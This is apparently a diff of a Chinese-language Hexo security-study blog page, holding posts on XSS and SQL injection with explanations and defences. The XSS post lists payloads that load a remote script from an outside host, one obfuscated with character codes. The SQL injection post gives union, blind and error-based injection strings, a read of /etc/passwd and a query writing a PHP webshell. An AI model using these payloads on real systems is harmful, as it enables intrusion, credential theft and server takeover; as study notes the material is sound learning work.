@@ -50,7 +50,7 @@
         
           <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Søk"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
@@ -61,15 +61,208 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-注入练习" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CSRF" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2016/09/18/注入练习/" class="article-date">
-  <time datetime="2016-09-18T07:44:26.245Z" itemprop="datePublished">2016-09-18</time>
+    <a href="/2016/08/30/CSRF/" class="article-date">
+  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
 </a>
     
   </div>
   <div class="article-inner">
     
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/30/CSRF/">CSRF</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><br></p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/30/CSRF/" data-id="cit8bn8290000zcqvo8z9xj2y" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-XSS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/30/XSS/" class="article-date">
+  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/30/XSS/">XSS</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>跨站脚本攻击（Cross Site Scripting），为不和层叠样式表的英文缩写混淆，故将跨站脚本攻击缩写为XSS。攻击者往web页面里插入恶意的html代码，当用户浏览该网页时候，嵌入该网页的html代码会被执行，从而达到攻击用户的目的。其重点已经不在’跨站’而是’脚本’,主要有两个：JavaScript和ActionScript</p>
+<p>产生原因：<br>    网页提供我们输入信息的表单，同时可以把我们输入的信息输出到网页上。我们输入的是一个字符串，但这个字符串也可以是标记语言格式的字符串。浏览器新人服务器返回的标记语言格式的字符串(html源代码)，所以直接渲染显示到浏览器上形成可视化界面。我们输入的恶意的标记语言格式的字符串达到攻击的目的。</p>
+<p>出现XSS：url的参数回显到网页上、form表单提交的内容出现在网页上，如昵称、邮件、简介、留言板等</p>
+<p>危害：<br>    可以利用XSS获取用户的Cookie、改变网页内容、URL跳转、有局限性的键盘记录。</p>
+<p>利用：<br>    1、反射型XSS<br>    2、储存型XSS<br>    3、DOM XSS：代码不需要服务器解析响应的直接参与，触发XSS靠的是浏览器的DOM解析，可以认为完全是客户端的事<br>    4、flash XSS：利用网页上的flash文件的缺陷来执行js脚本，一般是反射性XSS<br>    5、m XSS：突变XSS，主要用于过滤的绕过。</p>
+<p>发现XSS：<br>    1、反射型XSS：url参数中的值，能够回显到返回的html中，url的参数值没有被过滤或者是过滤不严格。<br>    2、储存型XSS：可以提交内容，提交内容能被管理员或其他用户查看，提交的内容没有被过滤或者过滤不严格。</p>
+<p>过滤：<br>    前端过滤、输入过滤、输出过滤。<br>    输入过滤：服务器脚本接收用户提交的数据后，写入到数据库中，之间对数据进行过滤，称之为输入过滤，一般采用黑白名单过滤，或者是对提交的数据进行html实体编码<br>    输出过滤：服务器脚本在显示数据时，需要从数据库中读取数据再返回数据包，之间进行过滤，称之为输出过滤。一般采用黑白名单，或对数据进行html实体编码。<br>    前端绕过：可以用burpsuite拦截数据包，改包绕过。</p>
+<p>绕过方式：<br>    &lt;&gt;被过滤，一般很难触发XSS漏洞，除非输入内容直接输入到”script \script”标签内。<br>    script被过滤 可以用img svg标签替换。特殊字符被过滤，编码ascii 16进制</p>
+<p>修复：<br>    1、对用户的输入进行严格的过滤，一般为基于黑白名单过滤。白名单过滤的防御效果更好，对于用户在白名单之外的输入，直接忽略。构造白名单的过程中需要尽量保证在不影响用户体验的同时，尽可能杜绝一切不必要的输入。<br>    2、Flash XSS修复需要对相应的flash进行修改或升级替换。<br>    3、在cookie中加入httponly属性可以在一定程度上保护用户的cookie，减少出现XSS时的损失。</p>
+<p>示例代码：</p>
+<pre><code>&lt;script src=&apos;http://b.ioio.pub/xss/probe.js&apos;&gt;&lt;/script&gt;
+&lt;img src=xonerror=&quot;s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://b.ioio.pub/xss/probe.js&apos;&quot;;&gt;
+&lt;svg onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://b.ioio.pub/xss/probe.js&gt;
+&lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47,112,114,111,98,101,46,106,115)) &gt;
+</code></pre><p><br></p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/30/XSS/" data-id="cit8bn82o0001zcqvzlhibk63" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/30/SQL注入/" class="article-date">
+  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/30/SQL注入/">SQL 注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>sql注入是一种把sql代码插入到url或web表单请求的参数中，之后再将这些参数传递给后台的SQL服务器解析并执行。最终达到欺骗服务器执行恶意的sql代码。</p>
+<p>产生原因：SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。</p>
+<p>利用：可以利用sql注入获取数据包括用户数据后台管理账号密码等，如果有读写权限并知道网站的绝对路径，还可以load_file()读取文件内容、into outfile 写入webshell进行攻击，</p>
+<p>利用手法：</p>
+<ul>
+<li>url判断注入：<pre><code>and 1=1 / and 1=2 回显页面不同(整型判断)
+单引号‘显示数据库错误信息(整型、字符串类型判断) 
++1/-1回显上个页面（整型判断）
+and sleep(5) （判断网页返回时间）
+</code></pre></li>
+<li>读取文件： select load_file(‘/etc/passwd’)<pre><code>select load_file(&apos;D://xxxxx//phpstudy//WWW//1.txt&apos;)
+</code></pre></li>
+<li>写入：select ‘&lt;?php phpinfo(); ?&gt;’ into outfile ‘D://xxxxx//phpstudy//WWW//121.php’<pre><code>select &apos;&lt;?php phpinfo(); ?&gt;&apos; INTO OUTFILE &apos;/var/www/html/webshell.php&apos;;
+</code></pre></li>
+<li>获取绝对路径：php报错显示绝对路径、load_file()读取配置文件、phpinfo.php </li>
+</ul>
+<p>根据sql数据类型分类：</p>
+<ul>
+<li>字符串类型注入和整型注入、搜索类型注入</li>
+</ul>
+<p>根据注入语法注入：</p>
+<ul>
+<li>可联合查询注入：有显示位<pre><code>order by 判断列数
+union 1，2，3 判断显示位
+</code></pre>  例：<pre><code>?id=-1&apos;  union select 1,2,(select versraion()) --+
+?id=-1&apos;  union select 1,2,(select  group_concat(distinct table_schema) from information_schema.columns) --+                   
+</code></pre></li>
+<li><p>布尔型注入:页面存在注入，没有显示位，没有数据库出错信息，只能通过页面返回正常不正常进行判断来sql注入 </p>
+<pre><code>exists():检查子查询是否有返回值，返回True或False
+ascii():返回字符串str的最左边字符的ascii代码值，
+substr(string,numstart,numlength):
+</code></pre><p>  例：<br>  判断有多少个数据库：</p>
+<pre><code>?id=1&apos; and ((select count(distinct table_schema) from information_schema.columns)&gt;8) --+
+</code></pre><p>  查看第一个数据库字段的长度：</p>
+<pre><code>?id=1&apos; and (select length((select distinct table_schema from information_schema.columns limit 0,1))&gt;17)
+</code></pre><p>  查看第一个数据库的第一个字符的ascii码：</p>
+<pre><code>?id=1&apos; and (select ascii(substr((select distinct table_schema from information_schema.columns limit 0,1),1,1))&gt;104) --+
+</code></pre></li>
+</ul>
+<ul>
+<li>报错注入：有报错信息 mysql_error()<pre><code>count(*)
+concat()
+(floor(rand(0)*2))a
+group by a
+</code></pre>  例：<br>  查看版本信息：<pre><code>?id=1&apos; union select 1,count(*),concat(version(),0x7e,floor(rand(0)*2))x from information_schema.columns group by x --+
+</code></pre>  查看有多少个库：<pre><code>?id=1&apos; union select 1,count(*),concat((select count( distinct table_schema) from information_schema.columns),0x7e,floor(rand(0)*2))x from information_schema.columns group by  x--+
+</code></pre>  查询数据库名(limit)<pre><code>(select distinct table_schema from information_schema.columns limit 1,1)
+</code></pre></li>
+</ul>
+<ul>
+<li>可多语句查询注入：<pre><code>sqlserver数据库
+例：http://hello.com/view?id=1;update t1 set content =&apos;aaaaaaaaa&apos;
+</code></pre></li>
+<li>基于时间延迟注入：<pre><code>sleep()
+</code></pre></li>
+<li>偏移注入、宽字节注入、二次注入</li>
+</ul>
+<p>防御：<br>     1.永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双”-“进行转换等。<br>     2.永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。<br>     3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。<br>     4.不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。<br>     5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装<br>     6.sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFTSCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。</p>
+<p><br></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/30/SQL注入/" data-id="cit8bn82w0002zcqvt8xud2a7" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-注入练习" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/30/注入练习/" class="article-date">
+  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/30/注入练习/">注入练习</a>
+    </h1>
+  
+
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
@@ -173,190 +366,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/09/18/注入练习/" data-id="cit8bj90h0001d4qv5f4snlaj" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-XSS" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/08/30/XSS/" class="article-date">
-  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/30/XSS/">XSS</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>跨站脚本攻击（Cross Site Scripting），为不和层叠样式表的英文缩写混淆，故将跨站脚本攻击缩写为XSS。攻击者往web页面里插入恶意的html代码，当用户浏览该网页时候，嵌入该网页的html代码会被执行，从而达到攻击用户的目的。其重点已经不在’跨站’而是’脚本’,主要有两个：JavaScript和ActionScript</p>
-<p>产生原因：<br>    网页提供我们输入信息的表单，同时可以把我们输入的信息输出到网页上。我们输入的是一个字符串，但这个字符串也可以是标记语言格式的字符串。浏览器新人服务器返回的标记语言格式的字符串(html源代码)，所以直接渲染显示到浏览器上形成可视化界面。我们输入的恶意的标记语言格式的字符串达到攻击的目的。</p>
-<p>出现XSS：url的参数回显到网页上、form表单提交的内容出现在网页上，如昵称、邮件、简介、留言板等</p>
-<p>危害：<br>    可以利用XSS获取用户的Cookie、改变网页内容、URL跳转、有局限性的键盘记录。</p>
-<p>利用：<br>    1、反射型XSS<br>    2、储存型XSS<br>    3、DOM XSS：代码不需要服务器解析响应的直接参与，触发XSS靠的是浏览器的DOM解析，可以认为完全是客户端的事<br>    4、flash XSS：利用网页上的flash文件的缺陷来执行js脚本，一般是反射性XSS<br>    5、m XSS：突变XSS，主要用于过滤的绕过。</p>
-<p>发现XSS：<br>    1、反射型XSS：url参数中的值，能够回显到返回的html中，url的参数值没有被过滤或者是过滤不严格。<br>    2、储存型XSS：可以提交内容，提交内容能被管理员或其他用户查看，提交的内容没有被过滤或者过滤不严格。</p>
-<p>过滤：<br>    前端过滤、输入过滤、输出过滤。<br>    输入过滤：服务器脚本接收用户提交的数据后，写入到数据库中，之间对数据进行过滤，称之为输入过滤，一般采用黑白名单过滤，或者是对提交的数据进行html实体编码<br>    输出过滤：服务器脚本在显示数据时，需要从数据库中读取数据再返回数据包，之间进行过滤，称之为输出过滤。一般采用黑白名单，或对数据进行html实体编码。<br>    前端绕过：可以用burpsuite拦截数据包，改包绕过。</p>
-<p>绕过方式：<br>    &lt;&gt;被过滤，一般很难触发XSS漏洞，除非输入内容直接输入到”script \script”标签内。<br>    script被过滤 可以用img svg标签替换。特殊字符被过滤，编码ascii 16进制</p>
-<p>修复：<br>    1、对用户的输入进行严格的过滤，一般为基于黑白名单过滤。白名单过滤的防御效果更好，对于用户在白名单之外的输入，直接忽略。构造白名单的过程中需要尽量保证在不影响用户体验的同时，尽可能杜绝一切不必要的输入。<br>    2、Flash XSS修复需要对相应的flash进行修改或升级替换。<br>    3、在cookie中加入httponly属性可以在一定程度上保护用户的cookie，减少出现XSS时的损失。</p>
-<p>示例代码：</p>
-<pre><code>&lt;script src=&apos;http://b.ioio.pub/xss/probe.js&apos;&gt;&lt;/script&gt;
-&lt;img src=xonerror=&quot;s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://b.ioio.pub/xss/probe.js&apos;&quot;;&gt;
-&lt;svg onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://b.ioio.pub/xss/probe.js&gt;
-&lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47,112,114,111,98,101,46,106,115)) &gt;
-</code></pre><p><br></p>
-<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/30/XSS/" data-id="cit8afyyy0000wgqvp7c21u26" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-CSRF" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/08/30/CSRF/" class="article-date">
-  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/30/CSRF/">CSRF</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><br></p>
-<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/30/CSRF/" data-id="cit8afyz40001wgqv2vmech5x" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/08/30/SQL注入/" class="article-date">
-  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/30/SQL注入/">SQL 注入</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>sql注入是一种把sql代码插入到url或web表单请求的参数中，之后再将这些参数传递给后台的SQL服务器解析并执行。最终达到欺骗服务器执行恶意的sql代码。</p>
-<p>产生原因：SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。</p>
-<p>利用：可以利用sql注入获取数据包括用户数据后台管理账号密码等，如果有读写权限并知道网站的绝对路径，还可以load_file()读取文件内容、into outfile 写入webshell进行攻击，</p>
-<p>利用手法：</p>
-<ul>
-<li>url判断注入：<pre><code>and 1=1 / and 1=2 回显页面不同(整型判断)
-单引号‘显示数据库错误信息(整型、字符串类型判断) 
-+1/-1回显上个页面（整型判断）
-and sleep(5) （判断网页返回时间）
-</code></pre></li>
-<li>读取文件： select load_file(‘/etc/passwd’)<pre><code>select load_file(&apos;D://xxxxx//phpstudy//WWW//1.txt&apos;)
-</code></pre></li>
-<li>写入：select ‘&lt;?php phpinfo(); ?&gt;’ into outfile ‘D://xxxxx//phpstudy//WWW//121.php’<pre><code>select &apos;&lt;?php phpinfo(); ?&gt;&apos; INTO OUTFILE &apos;/var/www/html/webshell.php&apos;;
-</code></pre></li>
-<li>获取绝对路径：php报错显示绝对路径、load_file()读取配置文件、phpinfo.php </li>
-</ul>
-<p>根据sql数据类型分类：</p>
-<ul>
-<li>字符串类型注入和整型注入、搜索类型注入</li>
-</ul>
-<p>根据注入语法注入：</p>
-<ul>
-<li>可联合查询注入：有显示位<pre><code>order by 判断列数
-union 1，2，3 判断显示位
-</code></pre>  例：<pre><code>?id=-1&apos;  union select 1,2,(select versraion()) --+
-?id=-1&apos;  union select 1,2,(select  group_concat(distinct table_schema) from information_schema.columns) --+                   
-</code></pre></li>
-<li><p>布尔型注入:页面存在注入，没有显示位，没有数据库出错信息，只能通过页面返回正常不正常进行判断来sql注入 </p>
-<pre><code>exists():检查子查询是否有返回值，返回True或False
-ascii():返回字符串str的最左边字符的ascii代码值，
-substr(string,numstart,numlength):
-</code></pre><p>  例：<br>  判断有多少个数据库：</p>
-<pre><code>?id=1&apos; and ((select count(distinct table_schema) from information_schema.columns)&gt;8) --+
-</code></pre><p>  查看第一个数据库字段的长度：</p>
-<pre><code>?id=1&apos; and (select length((select distinct table_schema from information_schema.columns limit 0,1))&gt;17)
-</code></pre><p>  查看第一个数据库的第一个字符的ascii码：</p>
-<pre><code>?id=1&apos; and (select ascii(substr((select distinct table_schema from information_schema.columns limit 0,1),1,1))&gt;104) --+
-</code></pre></li>
-</ul>
-<ul>
-<li>报错注入：有报错信息 mysql_error()<pre><code>count(*)
-concat()
-(floor(rand(0)*2))a
-group by a
-</code></pre>  例：<br>  查看版本信息：<pre><code>?id=1&apos; union select 1,count(*),concat(version(),0x7e,floor(rand(0)*2))x from information_schema.columns group by x --+
-</code></pre>  查看有多少个库：<pre><code>?id=1&apos; union select 1,count(*),concat((select count( distinct table_schema) from information_schema.columns),0x7e,floor(rand(0)*2))x from information_schema.columns group by  x--+
-</code></pre>  查询数据库名(limit)<pre><code>(select distinct table_schema from information_schema.columns limit 1,1)
-</code></pre></li>
-</ul>
-<ul>
-<li>可多语句查询注入：<pre><code>sqlserver数据库
-例：http://hello.com/view?id=1;update t1 set content =&apos;aaaaaaaaa&apos;
-</code></pre></li>
-<li>基于时间延迟注入：<pre><code>sleep()
-</code></pre></li>
-<li>偏移注入、宽字节注入、二次注入</li>
-</ul>
-<p>防御：<br>     1.永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双”-“进行转换等。<br>     2.永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。<br>     3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。<br>     4.不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。<br>     5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装<br>     6.sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFTSCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。</p>
-<p><br></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/30/SQL注入/" data-id="cit8bj9070000d4qvzr71b9ed" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/30/注入练习/" data-id="cit8bn83m0006zcqvdhwl4006" class="article-share-link">Share</a>
       
       
     </footer>
@@ -407,7 +417,7 @@ group by a
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/16/read_sqlmap/" data-id="cit7x4xjw00013sqvbjww2nd1" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/16/read_sqlmap/" data-id="cit8bn83f0005zcqvuwztuz0n" class="article-share-link">Share</a>
       
       
     </footer>
@@ -470,7 +480,7 @@ group by a
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/16/需要复习的知识/" data-id="cit7x4xjw00023sqvp3xxkk4i" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/16/需要复习的知识/" data-id="cit8bn83p0007zcqvhwx741rv" class="article-share-link">Share</a>
       
       
     </footer>
@@ -555,7 +565,7 @@ group by a
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/11/nmap常用命令/" data-id="cit7x4xjg00003sqvbwcxecpj" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/11/nmap常用命令/" data-id="cit8bn8330003zcqvr870hx7b" class="article-share-link">Share</a>
       
       
     </footer>
@@ -600,7 +610,7 @@ group by a
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/11/sugar/" data-id="cit7x4xkr00043sqvu4qz3awv" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/11/sugar/" data-id="cit8bn8360004zcqv53it7o8e" class="article-share-link">Share</a>
       
       
     </footer>
@@ -625,9 +635,9 @@ group by a
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Arkiv</h3>
+    <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li></ul>
     </div>
   </div>
 
@@ -635,12 +645,12 @@ group by a
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Siste innlegg</h3>
+    <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
         
           <li>
-            <a href="/2016/09/18/注入练习/">(no title)</a>
+            <a href="/2016/08/30/CSRF/">CSRF</a>
           </li>
         
           <li>
@@ -648,11 +658,11 @@ group by a
           </li>
         
           <li>
-            <a href="/2016/08/30/CSRF/">CSRF</a>
+            <a href="/2016/08/30/SQL注入/">SQL 注入</a>
           </li>
         
           <li>
-            <a href="/2016/08/30/SQL注入/">SQL 注入</a>
+            <a href="/2016/08/30/注入练习/">注入练习</a>
           </li>
         
           <li>
